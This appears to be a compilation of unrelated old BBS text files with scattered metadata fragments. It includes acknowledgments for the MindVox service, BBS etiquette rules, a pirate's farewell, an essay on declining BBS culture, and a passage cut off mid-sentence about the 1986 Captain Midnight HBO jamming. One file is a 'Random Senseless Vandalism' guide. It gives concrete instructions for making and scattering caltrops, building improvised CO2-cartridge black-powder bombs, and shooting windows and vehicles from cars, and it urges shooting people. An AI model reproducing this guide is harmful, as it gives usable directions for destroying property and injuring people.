mainstream.         Looking back over the years, there are very few of my friends who        have not in some way contributed to the genesis of Phantom Access        and the creation of MindVox, and I'd like to take this opportuni         ty to express my gratitude to all of them.         People I would like to specifically thank, and without whom Mind         Vox  could  not  have  been launched in the manner we wanted, in         clude               First and foremost, my fiance Delia, who has  made  much  of        the last several years possible  who never knew about  Lord Digi         tal  when she met me  who has  gone  from   computers,  uh,  ugh,        that's  so  . . . um, dull  to not only seeing the potentials in         herent in the capabilities the technology  presents  to  all  so         ciety,  but actually extending many hundreds of hours of her time        to scripting sections of the project and designing human interac         tion  POV's  based  upon her lifelong experience with theatre and        film.  She has also shown remarkable grace by retaining  a  sense        of  humor  when  dealing  with  2am anonymous calls from computer        dudes who feel compelled to ask  so, what does Lord Digital do in        bed   questions.              The second person to whom I owe a great deal is Bruce Fanch         er,  my  partner in this endeavor, as well as half a hundred pro         jects that have spanned over a decade.  Without you  many  things        would not have been possible, and those that were would have been        a lot less fun.  It has been an interesting  experience  watching        someone  grow  into  an  adult who has retained all the qualities        that made them so much fun to hang out with  in  our  youth,  yet        managed  to temper that childlike glee with responsibility, humor        in the face of adversity, and that elusive quality called charac         ter.  Here's to another couple of decades of Lord   Lord.              I would like to thank every member  of  the  Phantom  Access        Group  for  the  thousands of hours spent designing, implementing        and de bugging the programs  that  make  MindVox  come  to  life.        Respective   of  some  people's  desire  to  remain  out  of  the        spotlight, I will leave it at that.  You know who you are    any         one  who really cares to find that out can do so at any time they        desire.              Phiber Optik   For applying his considerable skills in a po         sitive  direction  and  helping  us make MindVox a very difficult        fortress to lay siege to, while at the same time adding a tremen         dous  amount  of versatility to our networking and communications        interface options.  Most of all, thank you for having the courage        to  realize  that the world is not always a logical or fair place        and that no matter how intelligent you are or how noble your  in         tentions,  you  can  be dragged down by the stupidity and fear of        those around you if you associate with people who  do  not  share        the same qualities you possess.              Charles   For a great deal of assistance in updating many of        us regarding the current status of new technology and what's just        over the horizon, as well as providing tremendous aid by  showing        us  functional  examples  of  the state of the art in distributed        electronic networking, and taking us  on  a  fast forward  cruise        through  a  wide  variety  of  hardware platforms and development        tools.  Your friendship, advice, and persistent belief in our vi         sion, has been invaluable.              Len Rose   For being a good friend over the years and always        giving  assistance  with  anything  we  have needed.  Most of all        thanks for coming out of everything you've been through with  op         timism about the future and an intact belief system.  Peace.              George Gleason   For being a person who has become one of my        close friends faster than anyone else ever did.  For possessing a        really beautiful outlook on life   everything in it, and for  al         ways  being  a calming voice when things are completely crazy and        the moon is full.              Bruce Sterling   For his encouragement, support, and a real         ly  funny  talk  at CFP 2.  Most of all, the deepest appreciation        for doing an admirable job of presenting the unbiased truth while        chronicling some of the events that have taken place on the fron         tiers of Cyberspace.              Mike Godwin   For putting up  with  many  long  and  strange        phone calls regarding a wide variety of topics  for helping us to        avoid potential pitfalls and difficulty  for providing encourage         ment  and  advice, and in general, for being a really cool person        who has gone out of his way many times to provide us with  assis         tance.              Thomas Dell   For writing code full  of  obscure  jokes  and        weird  ramblings that do wonders to wake you up and get your full        attention when you are changing things at 3am, and for  being  an        exceptionally  gracious  guy who is one of the limited handful of        people that have maintained their sense of vision in the face  of        impending mediocrity and industrialization.              Special thanks to Dan, SN, SR, D00f and everyone in DPAK and        cDc,  who  comprise some of the very few who managed to grasp the        obvious, and in turn make use of this knowledge in an  entertain         ing and lucid manner.  Additional accolades to DPAK for being the        only eL!te duDeZ to use a four letter acronym instead of a  three        letter one.  The vision, the sheer wow!              Mega Supra Surfin the Ozone Thanks to  Mondo  2000.   Beyond        the  sea  of  screaming  fluff  and  designer hyperbole contained        within the covers of any issue of Mondo, there is  also  a  great        deal of truth to be found about Cyberspace, music, art, film, and        life in general.  Mondo has thus far shown itself  to  be  beyond        reproach  as  far  as journalistic ethics and presentation of the        facts are concerned.  It is also to be commended as a publication        with  a  sound  belief in typing words at random and letting them        fall where they may.              Finally, tremendous gratitude goes to Jim Thomas.  A  person        I  do  not  know  and have never spoken with, yet someone who has        done an exceptionally important  service  to  all  of  Cyberspace        with  the  forum  presented  by Computer Underground Digest.  Ir         respective even of CuD, I  have  heard  nothing  but  praise  and        well wishing from the many you have helped.  Thank you.

We're just the Wrecking Crew   Poor boys with nothing to do!                                                             The Adolescents       History is made at night    character is what you are in the dark.                                                           Lord John Whorfin  Hot summer nights are the same no matter where you live . . . there's nothing like a warm July evening to inspire a bunch of sex starved adolescents to acts of Random Senseless Vandalism  RSV .  Unfortunately, this time of year also tends to drain one's mind of all ideas that one might have for such activities. Fear not!  Contained herein are myriad suggestions of how to spend a few early morning hours enjoying yourself and annoying others.  Call your frhends together and try a few out.  A night of RSV is usually divided into two modes.  The first mode is Cruising    simply driving along major thoroughfares until an opportunity presents itself.  Of course, you'll be keeping your eyes open for nubile members of the opposite sex, and your windows open  or better, your roof down  so the rest of the world can admire your taste in music and in clothing.  On a well balanced night of RSV, most of your time will be spent in this mode, so choose your music well.  Here are a few tunes which I have found to be quite appropriate for tooling down the streets at 2 AM    ALWAYS use the 12  single versions.  Phil Collins  In The Air Tonight Harold Faltermeyer  Axel F. Dead Or Alive  Round Round Alphaville  Big In Japan Jean Michel Jarre  Zoolook Burning Sensations  Pablo Picasso Duran Duran  View to a Kill Russ Ballard  Voices Cheap Trick  You Must Be Dreaming      After you've been to two McDonald's and five Circle K's, and you've seen enough pussy to keep you horny for over a year    so it's time to move out and start the second mode  Random Senseless Vandalism.  The mood of the music goes over the edge, meaning, of course, Punk!  Some sample tunes   Sex Pistols  Anarchy in the U.K. Fear  Let's Have A War GBH  Do What You Do Adolescents  Wrecking Crew DEVO  Smart Patrol Mr. DNA Black Flag  Police Story, T.V. Party Red Alert  In Britain Bad Religion  In The Night  But, as the question goes, what do you DO when you Do What You Do   Now that we've set up an appropriate musical mood, we can start in on the good stuff  dhe Random Senseless Vandalism itself.  You'll need a few tools.  A sample list follows.  crowbar wire cutters flashlight w red filter spray paint survival knife short  18   length of chain rocks  medium large  caltrops  lots  toilet paper rope assorted fireworks BB or pellet gun rifle water balloons  Crowbar   The ultimate multi purpose vandalism tool.  Can be used to shatter      windows, break off doorknobs, and to pry open practically anything you     like.  Wire Cutters   You never know when you might walk into a fence you don't happen to      like, and some good wire cutters can alleviate the situation.  Make sure      the fence isn't electrified before you try anything with it!  Barbed wire      looks nice wrapped around the front end of a car, replacing its grille,      or festooned along the walls of your room.  And a stretch of chainlink      adds a nice touch to any bedroom decor.  Flashlight w Red Filter   There is nothing more suspicious looking than a      bunch of guys out in a field with a flashlight, and the red filter will      help alleviate observation problems.  Also, the red color allows you to      retain your night vision while keeping your eyes on what you are doing.  Spray Paint   The possibilities are endless.  Check out my file  Fun! with      Spray Paint  for a few of them.  Survival Knife   This tool takes care of the stuff that the crowbar and the      wire cutters aren't really designed for.  Try these  cutting down      tire and rope swings in front yards, slashing banners, collecting flags       it's illegal to display them at night without proper illumination      anyway , slicing seatbelts that assholes leave hanging out of their car      doors.  Fucking with convertible tops is bad form, but tarps over boats      or cars are great, especially if it's raining.  Short  18   Length of Chain    ake it sturdy, this one will be taking a lot of      abuse.  Use it on car bodies and windows, or connect it to your rope to      tow something large down the street a ways.  Be careful, though!       Remember what happened in Mad Max!  Rocks   Easy to find, easier to use.  The windows of houses and moving are  targets for rocks.  Caltrops   In case an irate smart ass citizen decides to chase you.   Don't      use 'em on cops unless you're SURE they didn't get a good look at your      car!   A caltrop is a piece of metal that, when you throw it onto the      ground, always lands so that one point sticks up into the air where it      can do major damage to tires and to feet wearing anything less than good      work boots.  Sure, a board with nails in it will do the same thing, but      caltrops are less noticable, and who the hell is dumb enough to drive      over a random board in the middle of the street anyway   The simplest      reliable design is to take two nails, cut the heads off and sharpen both      ends of each, bend them to an angle of about 135 degrees, and weld them      together at the bend.  If you're serious about it, get together with a      few of your friends and set up a mass production line for a few hours the      evening before you all go out, and make about 50 of them.  If you drop      them on a road  handfuls of 6 8 work well , don't travel on that road for      a while!  And of coursd, you can just dump them in the middle of a major      intersection in the dead of night.  Or in a parking lot outside a movie      theater just before the movie lets out.  Caltrops pack one hell of a      wallop for their size.  Toilet Paper   No anarchy run is truly complete without toilet paper,      especially if it looks like it's going to rain.  When toilet paper gets      wet, you can forget about trying to clean it up, because you CAN'T.  If      the weather is nice, why not consider looking for a garden hose to help      the paper along   Rope   You'll always be able to find a good use for rope.  In fact, there's      really no need to go out and  buy  rope  chances are you'll be able to      find some on the way somewhere.  Flagpole rope is made amazingly strong      since it has to stand up to years of the elements    who wants to change      the rope on a flagpole     so get that kind if you can.  It's easy to      find on any school campus.  It's great fun to tie a sturdy slip knot on a      flagpole rope, tie the loose end to the back of a pickup, then take off.       See what gives first, the pole or the back of the truck.  For that      matter, the rear axle trick from American Graffiti is pretty amusing too,      if your rope is strong enough.  Assorted Fireworks   Ah, yes, the Flames of the Gods.  There's nothing like      driving around town, lighting fireworks, and throwing them out the      window.  Bottle Rockets are the most spectacular . . . they'll sit on the      road until you're a few dozen yards away, then take off to God Knows      Where.  Sometimes they'll fly down the street a ways, then hit a curb      and arc off in the direction of someone's bedroom window.   Of course,      you're using the kind  with report  for maximum effect, aren't you         M 80's and their more powerful homemade cousins are wonderful for      mailboxes, placing on car windshields, and just plain waking up everyone      within a quarter mile.  Those  whistling cabins  are great for annoying      dogs as well as people, and if you run across a car that someone forgot      to lock, make sure the windows are rolled up and lob a few smoke bombs      inside.  Kiss the interior of that vehicle GOODBYE.  If you have      something a bit more powerful, like a CO2 cartridge filled with black      powder, knock a hole in a cinderblock wall with a large rock and drop the      pecker inside it.  The brick it gets stuck next to is history.  Looking      to shatter windows   Take one of those CO2 bombs with a long fuse and put      it in the middle of a 32 oz. glass bottle full of gravel, pick a nice      building with a lot of glass on it, drop and light the bomb, and LEAVE.       Wheee!  Shrapnel!  Who says the Neon Knights have all the fun   BB or Pellet Gun Rifle   For non assholes only.  Leave the small animals alone      . . . save your ammo for the targets that deserve to be abused, things      like people.  Air guns are at their best when you're in a moving car.       Pump up the air rifle and load a few BB's in, then buzz by the local car      dealership and take out that nice big showroom window    ftow!  Mr. Slick      Sam, The Used Car Man, now has to unload an Eldie or two to pay for a new      pane of glass.  And oh, how expensive that glass can be!  These are also      great for vans with custom murals on the side.  You can elect to use low      power and just deface the thing, or go all the way and punch a few holes.      'Sup to you!  And do you know how much it costs to replace the body      panels on a Corvette   Yow!  Water Balloons   Yeah, plain water balloons really belong to the      grade schoolers and the fraternity types with balloon launchers, but how      about putting about a tablespoon of Rit dye in the balloon before you      fill it   Looks really nice on stucco or on white cinderblock, where it      gets a chance to soak in for a few hours.  Be imaginative, use a few      balloons of different colors on a single target for some instant modern      art.  Your Bare Hands   A vandal needs no tools to do his dirty work    his bare      hands can do a great deal.  Try switching around a few realty signs.       Grab a trash bag that's waiting for the 6AM pickup as you drive by, then      drag it alongside the car as you speed down the street.  When it breaks,      someone will have a serious mess to deal with.  Or introduce that trash      bag to the neighbor's pool.  Bananna peels and pool filters get along      marvelously.  Got a road that's really just a loooooong hill   Montgomery      Blvd. in Albuquerque is a good example, with at lease five miles of long,      straight, gentle gradient.   Borrow  someone's spare tire and see how far      down the hill it'll roll before it hits something  or someone! .  Or       borrow  several, have everyone bet on a tire, and hold a race.       Well, people! Now you've got some ideas for your RSV runs!!         Go for it!!

"ethics.txt",8140,7987,59.79,2.84,19.3,"nd.","nd.","nd.","textfile","                       ETHICS FOR BBS USERS  The following are a few points of general BBS etiquette. If you wish to maintain your welcome on  whatever system you happen to call, it would be to your advantage to observe these few rules.  Sysops    feel free to download this   display it on your BBS   1. Don't habitually hang up on a system. Every Sysop  is  aware that accidental disconnections happen once in a while but we do tend  to  get annoyed with people who hang up every single time they call  because  they  are  either  too  lazy  to  terminate properly  or  they labor under the mistaken assumption that the 10 seconds they  save online is going  to  significantly  alter their  phone  bill.   Call Waiting  is not an acceptable excuse for long. If you have it and intend to use the line to call BBS systems, you should either have it disconnected  or  find  some other way to circumvent it.  such as using  70 before dialing   2. Don't do dumb things like leave yourself a message that says  Just  testing  to see if this thing works . Where do you think all those other messages came from if  it  didn't  work   Also, don't leave whiney messages that say  Please leave me a message  .  If ever there was a person to ignore, it's the one who begs someone to leave him a message. If you want  to  get  messages, start  by  reading the ones that are already online and getting involved in the conversations that exist.  3. Don't use the local equivalent of a chat command unless  you really  have  some clear cut notion of what you want to say and why. Almost any Sysop is more than happy to answer questions or offer help concerning his system. Unfortunately, because  about 85   of the people who call want to chat and about 99  of those people have absolutely nothing to  say  besides   How  old  are you   or something equally irrelevent, fewer Sysops even bother answering their pagers every day.  4.  When you are offered a place to leave comments when exiting a system,  don't  try  to  use  this  area  to  ask  the  Sysop questions.  It  is very rude to the other callers to expect the Sysop to carry on a half visible conversation with someone.  If you  have  a question or statement to make and expect the Sysop to respond to it, it should always be made in the section where all the other messages are kept. This allows the Sysop to  help many  people  with  the  same  problem with the least amount of effort on his part.  5. Before you log on with your favorite  psuedonym,  make  sure that  handles  are allowed. Most Sysops don't want people using handles on the system. There is not enough room for them,  they get  silly  games of one upmanship started, it is much nicer to deal with a person on a personal basis, and last but not least, everyone should be willing to take full responsibility for  his actions  or  comments  instead  of  slinging  mud from behind a phoney name.  6. Take the time to log on properly. There is no such place  as RIV,  HB,  ANA  or any of a thousand other abbreviations people use instead of their proper city. You may think  that  everyone knows  what  RIV  is supposed to mean, but every BBS has people calling from all around the  country  and  I  assure  you  that someone  from  Podunk  Iowa  has  no  idea  what you're talking about.  7. Don't go out of your way  to  make  rude  observations  like  Gee,  this  system  is  slow .  Every  BBS  is  a  tradeoff of features. You can generally assume that if someone is running a particular brand of software, that he is either happy  with  it or he'll decide to find another system he likes better. It does nobody any good when you make comments about something that you perceive  to  be  a  flaw  when it is running the way the Sysop wants it to. Constructive criticism is somewhat  more  welcome. If you have an alternative method that seems to make good sense then run it up the flagpole.  8.  When  leaving messages, stop and ask yourself whether it is necessary to make it private. Unless there is  some  particular reason  that  everyone shouldn't know what you're saying, don't make it private. We don't call them PUBLIC bulletin boards  for nothing,  folks.  It's  very  irritating  to other callers when there are huge blank spots in the messages that they can't read and it stifles interaction between callers.  9. If your favorite BBS has a time limit,  observe  it.  If  it doesn't,  set  a  limit  for  yourself and abide by it instead. Don't tie up a system until it finally kicks you off  and  then call  back  with  another  name.  This  same  rule  applies  to downloading or playing games. Only one person at a time can  be logged  on  to  a BBS and it isn't fair to everyone else if you overstay your welcome. Remember, a BBS is best when it  can  be left  wide  open.  If you try and cheat the rules you just hurt everybody by forcing the Sysop to adopt more strigent policies. I can't count the number of systems that are now locked tighter than a drum because of people who cheat and abuse.  10. Don't call a BBS just to look at  the  list  of  other  BBS numbers.  Most especially don't call a system as a new user and run right to the other numbers list.  There  is  probably  very little that's more annoying to any Sysop than to have his board completely passed over by you on your way to another board.  11. Have the common courtesy to pay attention to what passes in front  of your face. When a BBS displays your name and asks  Is this you  , don't say yes when you can see perfectly well  that it  is  mispelled.  Also,  don't  start  asking questions about simple operation of a system until you have thouroghly read all of the instructions that are available to  you.  I  assure  you that  it  isn't any fun to answer a question for the thousandth time when the answer is prominently  displayed  in  the  system bulletins  or  instructions. Use some common sense when you ask your questions. The person who said  There's no such thing as a stupid question  obviously never operated a BBS.  12. If by some  chance you should encounter  an error while you are online  Heaven forbid! ,  ALWAYS take the time to leave the Sysop  a message describing the  circumstances.  Don't just say  There was an error . That is not helpful in the least. Chances are that he knows there was an error.  What he needs to know is what you were doing when the error occurred so that he can have some chance of finding and correcting it. If the error happened after you input something,  tell him what it was. Remember that a BBS can't improve unless you're willing to help.  13. Don't be personally abusive. It doesn't matter whether  you like a Sysop or think he's a jerk. The fact remains that he has a  large  investment  in making his computer available, usually out of the goodness of his heart. If you don't like a Sysop  or his  system,  just remember that you can change the channel any time  you want.  Calling a  Sysop  names or  making  uninformed comments  about his lifestyle only shows  you for the child you really are.  14.  Keep  firmly  in  mind that you are a guest on any BBS you happen to call. Don't think of logging on as one of your  basic human  rights. Every person that has ever put a computer system online for the use of other people has spent a lot of time  and money  to  do  so.  While he doesn't expect nonstop pats on the back, it seems reasonable that he should at least  be  able  to expect fair treatment from his callers. This includes following any  of  the  rules  for  system  use  he  has laid out without grumping about it. Every Sysop has his own idea of how he wants his system to be run. It is really none of your business why he wants to run it the way he does. Your  business  is  to  either abide by what  he says,  or call some other  BBS where you feel that you can obey the rules.

Started with the major bust of The NotSoHumble Babe of USA and The Grim Reaper of INC, and the dominoes just keep collapsing.  A lot of boards are either going down and converting to Public Domain, or unfortunate enough to be busted.       After a call of warning from Sought After saying that the authority is going for every high profile pirates in threads, I wonder if this whole thing is worth my life for.  I'm not saying I believe everything he said, but considering that I'm going to college in a few months and becoming too busy to handle modeming businesses, I can't stay in modeming world much longer even if I wanted to.  I have a nice personal life, a nice circle of friends, and most importantly, a nice and trusting reputation dubbed by all the people around me.  They think of me as a good person with good morals, and if modeming corrupts me any further, I might just well go for a suicide.       I'm terribly sorry for leaving, not because that I can't have fun with people anymore, but because that I'm leaving a lot of people disappointed and alone in the dust.  I had a ton of responsibilities from trainers to magazines to Ansi's, and I know a lot of people are counting on me for numerous projects and chores.  You can call me a wimp or a irresponsible jerk, but I just want to say this    Is this hobby worth my whole life for         I'm not preaching to anyone that they should quit or not, it's your own decision.  I'm not just blindly follwing what Sought After told me, but I also thought about life as a whole.  There's a long way down the road, and there's absolutely no reason to trip and fall off the cliff at the age of 17.       It's certainly been great in my almost 3 years of modeming.  It gave me confidence, new skills, another social life, and the taste of patience and ambition.  It's a great hobby and I'm sorry it had to end this way.  I have to go on in the cold, hard real world and spend more time on school matters, my job, and everything else that REALLY matters to me.  It's time to face the facts, time to face the music, and time to face the ultimate meaning of what life really is.       My board, Pool of Radiance, will be down, probably permenantly. So please stop calling it.  Here're some people I'd like to say goodbye to, from the bottom of my heart.  It's been great knowing you guys, good luck in your futures.        Rescue Raider   Sorry RR, it has to end sometimes.  I've done                       everything I could to help with your awesome                       trainers.  Someone else would have to pick it up                       for you.  You're a great person and thanks for                       all the cheats and trainers you've written for                       all of us to enjoy.

"bbsdeath.pro",7639,7490,63.83,2.85,15.79,"1977","1977","1977","textfile","  What ever happened to real bulletin board systems        First off, I'd like to make it perfectly clear that I cannot be  objective in these notes. These are observations,  but they are from  1  a Sysop    2  a user of 8BBS, the greatest BBS ever evolved    3  a boy ... who's become a boyish programmer    4  an old timer....1977 was when I first started       using BBS systems.    5  the author of a BBS system    If you're expecting objectivity, then don't bother reading on.  I have a rather unique perspective on the entire BBS scene.  I've been around since close to the beginning, and I'm wondering what has happened.  Have BBS's gone the way of CB  Is the entire system in a slump   Is there anything wrong at all     I'm going to try to present these questions and show how things have changed...for the better, and for the worst.  HISTORY     A long time ago, in a city far far away, two men had an insight.  Ward Christensen and Randy Suess wanted a way to leave notes and messages to their programmer engineer friends.  Back then, modems were used by field engineers and some high level executives to talk to their companies computers.  A 300 baud modem was extremely fast, as most people were using 110 baud TeleTypes.  Ward and Randy devloped the concept of the BBS.  They called it CBBS, for  Computer Bulletin Board System.  CBBS was the first of its kind.  It was an enormous program written in 8080 assmebly language.  By our standards today, it was kludgy and bug ridden, but back then it was heavenly.  Users could enter messages and read messages...  that was about it.    CBBS was a wonderful concept, but it was localized to the Chicago area.  Ward and Randy were the only ones who were running the program.  Then Bill Blue came along and wrote ABBS, which was designed to  emulate  the CBBS system.  I feel it was ABBS, rather than CBBS which made the real breakthrough.  While ABBS was much less powerful, and more difficult to use, it could be run on a  universal  machine     The Apple         Anyone with an Apple    and a D.C.  Hayes MM   modem could run ABBS. This program could be installed in a matter of minutes, and anyone could have their own bulletin board system.  Soon after the release of ABBS, several other BBS programs  for various computers  soon followed.  ABBS was the king for many years, just because there were more ABBS systems than any other BBS program available.    It is this time that I would like to refer to as the  Golden age of the BBS.  It wasn't as golden as you might think.  Most Sysops would come home every evening from work to find that their BBS had crashed because of yet another bug. Even back then, user's logged in under false names and left obscene messages.    The one point that made that age golden was the users.  Without users, a BBS is just a program.  With users, it gains a personality, and if I may be metaphysical, a soul.  The users MAKE the BBS. A Sysop may have the greatest BBS program in the world, but without active users, he just has a computer wasting line current.  LIFE IN THE  GOLDEN AGE     A user would think nothing of spending his Saturday helping  The Sysop  find an intermittant bug in the BBS program.    A user would not only answer his or HER mail, but also butt into other people's conversations and throw in his her two cents worth.    A user would suggest improvements to make the system easier to use.    A Sysop would care for his BBS like a baby.  He'd spend 2 hours each night writing messages and playing with modifications to the program.    A Sysop would NOT restrict conversation to one particular topic...such as CP M software.    A Sysop would tolerate kids who were just learning how to use modems.  He'd even give them a hand getting things working.    A Sysop would  on his own preference  dilligently weed out obscene or  pseudo illegal  messages,    or    promote them as he saw fit.    Users would start clubs, such as the well known  Gabber Gang  and later the infamous  Phone Phriekers  who figured so prominently into BBS history.    The government didn't try to restrict BBS users.  It was just  us  against tyranny  at that time  Ma Bell  .  Although most users did not approve of  Phone Phrieking , everyone talked about it, and was interested in it for curiosity sake if nothing else.   Hard to believe, but true.     Uploading and downloading of programs did not exist.    BBS's were few and far between.  When I wrote the OxGate, the two closest other CP M based machines were Kelly Smith in Simi Valley  375 miles away , and  Jim C  in Larkspur  100 miles away .  People tended to congregate on the local system.    WHAT HAS KILLED BBS SYSTEMS     1  Program uploading and downloading.  People just get their programs and leave.    2  The technical clique's retaliation against  gabbers  who just used the systems for personal communication.    3  Too many BBS systems in one area. BBS's are still alive and healthy in low density areas.    4  The loss of  anonimity  among BBS users.  The BBS used to be the place to escape.  Where no one had to be  themselves.  Users such as  James Bond  and  Captain Scarlet  were given free reign to vent their fantasies.  Today, most systems do not allow false names so they can keep track of users.    5  The anti hacker movement. More and more people today think the word  hacker  means  phone phriek computer crasher.  All it ever meant was  great programmer.  You would feel proud if someone labeled you a  hacker.     6  The press' ignorance of the BBS community.  By trying to make a scandal out of all of it, they ruined a great form of communication.  In particular, the magazine  InfoWorld  has done more harm to the BBS community than other press organization.  While they actively TRIED to HELP the community, they have caused more harm in their mis reporting of info.    7  Sysop's ignorance.  Quite frankly, the average quality of  Sysop  has dropped.  Sysop's are  on the whole  less active and less responsive than 5 years ago.  More and more of them are technically incompetent, they couldn't fix a bug if it bit them in the nose.    All of these problems are inter related.  We can't solve any of them until all of them are solved.  From my descriptions it should be obvious that the  golden age  certainly wasn't all gold.  People like  James Bond  and  Sam Daniels  had to be stopped, but the pendulum has swung too far to the opposite side.    These observations are very general. I've noticed this swing, and it has taken place on 95  of all of the system's I've called across America.  It's sad that these problems have stabbed us in the back, but it's not too late to try and bring about a change.  I don't have the answers, but maybe these observations will prompt thought into this death of a virtual  art form  of communication.    There is one possible solution to this problem...  the acceptance of children again. For too long we've been kicking off kids  both phyiscal and  kids at heart  .  They've been disruptive, and caused fights galore.  Many have even tried to crash the systems they used.     If there's any hope, it lies with the proles.     George Orwell, _1984_    Perhaps the thing to do is call a few local Commodore and Apple boards and let the users know that they're just as welcome on your super fancy 100mb 2400 baud RCP M system as any of your so  called  serious users  .  .  .   serious users  who can't even bring themselves to answer their own mail.  Saddening.   "
"captmidn.txt",24394,23981,68.91,2.74,17.22,"1985-1987","1985","1987","textfile","  It started out as just another Saturday.  April 26, 1986.  John R. MacDougall, 25, spent the day alone at his satellite TV dealership in Ocala, Florida, waiting for customers who never came.   It was,  he says,  a normal day in the doldrums of the satellite TV industry.  But that night, MacDougall, 5 feet 11, 225 pounds, and prone to nervously running his fingers through his reddish blond hair and adjusting his glasses, would transform into Captain Midnight and set the world of satellite television spinning.    Business had been flat since January 15, when Home Box Office became the first pay TV service to scramble its signal full time.  Other services were following HBO's lead.  Dish owners were balking at the cost of descramblers and program fees.  Potential customers were confused and stayed away in droves.The 1985 boom in dish sales had simply petered out, and MacDougall Electronics, in business for just two and a half years, had seen its early profits disappear.    American Dream    MacDougall had stopped advertising and turned off his air conditioner to save money.  With no customers, he idled away the day watching TV and reading magazines.  Later, he would say,  I have been watching the great American dream slip from my grasp.     To make ends meet, MacDougall spent his evenings moonlighting as a part time operations engineer at Central Florida Teleport, a local company that uplinks services to satellites.  He was a natural electronics engineer.  A good student, he had spent his spare time during his teenage years tinkering with CB radios and automobiles.  With some pals, he rebuilt a 1923 Ford roadster that he still owns.  He had dropped out of a management engineering course at Worcester Polytechnical Institute in Massachusetts after two years, but his first job was installing satellite TV dishes. My father used to tell me I would need to get a job where I would be able to make money by watching TV just because I liked TV so much,  he says.  At Central Florida Teleport, he could do just that.  At 4 p.m.  on that Saturday, MacDougall shut up shop.  He stopped at his home, where he lived alone, picked up a sandwich for supper, and then reported to the teleport.  After two hours, a second engineer went off duty and MacDougall was alone in the small building that is flanked on one side by five large satellite dishes.    As the end of his shift drew near, MacDougall was absently watching Pee Wee's Big Adventure, a movie he was uplinking for the now defunct pay per view service, People's Choice.  But something else was on his mind.  When the film ended, MacDougall went through the normal routine.  Before logging off, he set up color bars and punched buttons to swing the giant 30 foot dish he'd been using to its resting place.  That was necessary because the soil beneath the dish's cement pad is sandy clay.  Rainfall could throw it off kilter, but by setting it in a certain way the rain runs harmlessly into a gutter.  At its resting place, the dish points directly at the satellite Galaxy 1. Transpondedr 23 on that satellite carries the eastern feed of HBO.   That's when I decided to do it, says MacDougall.   It wasn't like I thought about it, 'Yes.  No.  Yes.  No.' It was just, 'Yeah!'  He scrolled up a character generator, and electronic keyboard that puts letters across the TV screen, and tried to think what to write.   I didn't know exactly how to start it,  he says.   I wrote 'Goodevening.  I wanted to be polite.  I didn't want it to be vulgar or call them names or anything.  That's not my style.     He spent a couple of minutes composing his message.  The idea of using the name Captain Midnight, he says,  just popped into my mind.  He had recently seen a movie with that title about a teenager who had a pirate radio station in his van.  Now HBO was airing the Sean Penn and Timothy Hutton espionage movie, The Falcon and the Snowman.  It was at 12 32 a.m.  Sunday, April 27, that John R.  MacDougall pushed the transmit button on his console and turned into Captain Midnight.   That's when I hit it,  he says.   It was almost like an out of body experience.  It was like I was there but I wasn't really there.     For 4 1 2 minutes, HBO viewers in the eastern United States saw this message                               GOODEVENING HBO                             FROM CAPTAIN MIDNIGHT                              12.95 MONTH                              NO WAY!                              SHOWTIME MOVIE CHANNEL BEWARE     A week earlier, MacDougall had successfully overridden HBO's powerful signal momentarily with just a test pattern.   He now publicly denies this, but he admitted it to a United States attorney.  The network had quickly brushed that signal aside, attributing it to not uncommon accidental interference.  This time, the engineer on duty at HBO's Long Island, New York, uplink station simply stepped up the signal's power.  HBO was transmitting at 125 watts.  When Captain Midnight applied more power, the HBO engineer revved up to match it.  He saw the interference and saw that he was losing a grip on things,  says George Dillon, an engineer who investigated the episode for the enforcement and investigative division of the Federal Communications Commission.   This little game took 60 to 90 seconds.  You had these two people at their respective stations fighting for control.     As Captain Midnight's signal surged, HBO placed a frantic call to Hughes Communications Inc., which owns Galaxy 1, asking    Is there something wrong with the bird   Says Dillon,  HBO thought it might cause damage to the satellite, so they gave it up.                      NEVER LOST CONTROL    In Ocala, Captain Midnight was stunned.   I could see my signal on top of HBO's as soon as I hit the transmit button,  says MacDougall.   I stared at the monitor for a while, and then I didn't know if it was two minutes or 10 minutes.  Caught up with engineering curiosity, he monitored power levels and downlink signals.   At no time,  he says,  did I lose control over the transponder.  But then, as suddenly as he had struck, he quit.   When I shut it off, I really didn't know how long I had been on top of HBO, but that's when I started to feel very guilty,  he says.   I thought,  Ohmigod, what did I do ' That thought raced through my mind for the next 10 or 15 minutes as I reconfigured the teleport back to normal.  The guilt really set in that night. I didn't sleep very well.     On Sunday morning he woke up to the same nagging doubts.   I thought maybe I should turn myself in.  But then I thought, 'Well, let's be rational.  Nobody's going to see it.  Nobody cares.  HBO will know.  They'll get the message. They'll reconsider their arbitrary and unfair pricing, and maybe I'll read about it in a few months in Satellite Orbit.  That's basically how I rationalized, not panicking, and went on with my daily routine that Sunday.'    Then he saw that Captain Midnight's HBO ambush was making TV's network newscasts, and he began to panic.   I was devastated and so nervous with frustration.  I had to work that night at the teleport.  Another man was going to be there for the first two hours.  When he got there I had to pretend and say things like,  Dkid you see this guy Captain Midnight   Geez, do you realize what in the world, he could have done ' That was difficult.     Normally, MacDougall's natural curiosity would have made him the first to want to discuss how it was done.  But as the event made national headlines and became fodder for jokes by David Letterman and Johnny Carson, he went the other way, trying to play it down.  The tension grew as HBO clamored for his head, and the FCC and even Congress got involved.    On April 28, HBO chairman Michael J.  Fuchs wrote to the FCC saying that the company had received calls threatening to move Galaxy 1 into a new orbit.  He urged the Commission to  use all its investigative resources  to capture Captain Midnight.     This wasn't just a jamming, but a jamming and replacement.  And a fascinating one at that,  says HBO spokesman Alan Levy.   That's why you saw a lot of action on this case.  We understand that the dish owners are at odds with the programmers, but when you escalate it to this point, it gets a little wild and woolly.  And when you're breaking the satellite system of the United States, it's very serious.     FCC investigator Dillon says the implications of the incident involved a threat to the national security.   There's lots of highly sensitive data involved.  If you have a bandit, it could disrupt the business of the United States  things like defense communications, medical information, telephone communications, and teleconferences.    Edgar Eagan, owner of Central Florida Teleport, took the incident very seriously.   He logged out and signed the log and decided to stay and play,  says Eagan, founder and past president of ESPN, the sports network.   In reality he was using the equipment for an unauthorized and illegal purpose.                         RUMORS GALORE    As the investigation proceeded, rumors abounded.  Satellite TV publications and television commentators received calls and tapes from people claiming to be Captain Midnight.  The FBI was said to be on the case, and the hunt was rumored to focus on Dallas, Texas.    In Ocala, MacDougall had decided to  play it dumb.  Discreetly, he talked to colleagues in the satellite TV business to find out how the investigation was going.  But gradually he could not resist discussing the incident with other engineers and operators who talked about what happens when two signals meet on a single transponder.  He was outraged when they dismissed his observations.     I don't like to say this, but even the more skilled personnel were of the assumption that you would never get a clear signal with two signals feeding on the same channel,  MacDougall says.   I brought out the fact that if one was much stronger than the other, it would override it.  At that point they told me I was wrong, and that I didn't know what I was talking about.     All of my life people have never 